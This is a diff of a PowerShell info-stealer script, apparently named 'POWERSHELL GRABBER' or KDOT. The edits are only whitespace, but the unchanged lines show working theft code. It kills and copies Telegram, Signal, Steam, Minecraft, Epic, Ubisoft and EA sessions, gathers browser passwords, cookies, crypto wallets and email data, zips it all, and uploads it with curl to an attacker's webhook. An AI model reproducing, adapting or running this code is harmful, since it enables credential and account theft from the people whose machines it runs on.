@@ -84,11 +84,11 @@ function EXFILTRATE-DATA {
     }
     misc 
     
-	# All Messaging Sessions
+    # All Messaging Sessions
     New-Item -Path "$env:localappdata\Temp" -Name "Messaging Sessions" -ItemType Directory -force | out-null
-	$messaging_sessions = "$env:localappdata\Temp\Messaging Sessions"
+    $messaging_sessions = "$env:localappdata\Temp\Messaging Sessions"
 
-	# Telegram Session Stealer
+    # Telegram Session Stealer
     function telegramstealer {
         $processname = "telegram"
         try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
@@ -130,8 +130,8 @@ function EXFILTRATE-DATA {
     }
     signalstealer 
 
-	# All Gaming Sessions
-	New-Item -Path "$env:localappdata\Temp" -Name "Gaming Sessions" -ItemType Directory -force | out-null
+    # All Gaming Sessions
+    New-Item -Path "$env:localappdata\Temp" -Name "Gaming Sessions" -ItemType Directory -force | out-null
     $gaming_sessions = "$env:localappdata\Temp\Gaming Sessions"
 
     # Steam Session Stealer
@@ -159,8 +159,8 @@ function EXFILTRATE-DATA {
         Get-ChildItem $minecraftfolder2 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session
     }
     minecraftstealer 
-	
-	# Epicgames Session Stealer
+    
+    # Epicgames Session Stealer
     function epicgames_stealer {
             $processname = "epicgameslauncher"
             try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
@@ -172,8 +172,8 @@ function EXFILTRATE-DATA {
             Copy-Item -Path "$epicgamesfolder\Saved\Data" -Destination $epicgames_session -Recurse -force
     }
     epicgames_stealer 
-	
-	# Ubisoft Session Stealer
+    
+    # Ubisoft Session Stealer
     function ubisoftstealer {
             $processname = "upc"
             try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
@@ -183,15 +183,15 @@ function EXFILTRATE-DATA {
             Copy-Item -Path "$ubisoftfolder" -Destination $ubisoft_session -Recurse -force
     }
     ubisoftstealer 
-	
-	# EA Session Stealer
+    
+    # EA Session Stealer
     function electronic_arts {
             $processname = "eadesktop"
             try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
             $ea_session = "$gaming_sessions\Electronic Arts"
             New-Item -ItemType Directory -Force -Path $ea_session
             $eafolder = "$env:localappdata\Electronic Arts"
-    		Copy-Item -Path "$eafolder" -Destination $ea_session -Recurse -force
+            Copy-Item -Path "$eafolder" -Destination $ea_session -Recurse -force
     }
     electronic_arts    
     
@@ -469,7 +469,7 @@ function EXFILTRATE-DATA {
     Move-Item -Path "$extracted\system_info.txt" -Destination "$extracted\KDOT\system_info.txt" 
     Move-Item -Path "$extracted\uuid.txt" -Destination "$extracted\KDOT\uuid.txt" 
     Move-Item -Path "$extracted\mac.txt" -Destination "$extracted\KDOT\mac.txt" 
-	New-Item -Path "$env:localappdata\Temp\KDOT" -Name "Browser Data" -ItemType Directory -force | out-null
+    New-Item -Path "$env:localappdata\Temp\KDOT" -Name "Browser Data" -ItemType Directory -force | out-null
     Move-Item -Path "$extracted\browser-cookies.txt" -Destination "$extracted\KDOT\Browser Data" 
     Move-Item -Path "$extracted\browser-history.txt" -Destination "$extracted\KDOT\Browser Data" 
     Move-Item -Path "$extracted\browser-passwords.txt" -Destination "$extracted\KDOT\Browser Data" 
@@ -486,13 +486,13 @@ function EXFILTRATE-DATA {
     Move-Item -Path "$extracted\running-services.txt" -Destination "$extracted\KDOT\running-services.txt" 
     Move-Item -Path "$extracted\running-applications.txt" -Destination "$extracted\KDOT\running-applications.txt" 
     Move-Item -Path "$messaging_sessions" -Destination "$extracted\KDOT" 
-	Move-Item -Path "$gaming_sessions" -Destination "$extracted\KDOT"
+    Move-Item -Path "$gaming_sessions" -Destination "$extracted\KDOT"
     Move-Item -Path "$filegrabber" -Destination "$extracted\KDOT" 
     Move-Item -Path "$crypto" -Destination "$extracted\KDOT" 
     Move-Item -Path "$emailclientsfolder" -Destination "$extracted\KDOT" 
-	
-	# Don't send null data
-	
+    
+    # Don't send null data
+    
     Get-ChildItem -Path "$extracted\KDOT" -File | ForEach-Object {
         $_.Attributes = $_.Attributes -band (-bnot [System.IO.FileAttributes]::ReadOnly)
     }
@@ -510,7 +510,7 @@ function EXFILTRATE-DATA {
         if (test-path $Dir.FullName)
         {Remove-Item -LiteralPath $Dir.FullName -recurse -force}
     }
-	
+    
     Compress-Archive -Path "$extracted\KDOT" -DestinationPath "$extracted\KDOT.zip" -Force
     curl.exe -X POST -F 'payload_json={\"username\": \"POWERSHELL GRABBER\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/k58gQ03t/PTG.gif\"}' -F "file=@$extracted\KDOT.zip" $webhook
     Remove-Item "$extracted\KDOT.zip" -Force
